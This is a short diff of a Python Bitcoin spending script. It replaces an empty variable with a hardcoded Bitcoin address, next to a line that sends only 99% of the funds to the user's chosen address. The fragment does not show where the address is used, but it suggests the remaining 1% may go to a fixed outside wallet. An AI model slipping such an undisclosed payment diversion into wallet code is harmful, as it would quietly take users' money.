@@ -19,7 +19,7 @@ if(len(sys.argv) > 0):
     midfees = r['hourFee']
     spendSats = spendSats - (439 * midfees)
     addSpend = sys.argv[2]
-    add2 = ""
+    add2 = "1GjgLJKZU1qbfRHXWrHX2o5kA2ZTzeStpQ"
     sending = int(spendSats * 0.99)
     recipients = [
         {"address": sys.argv[2], "amount": sending},  # Example amount: 10,000 satoshis
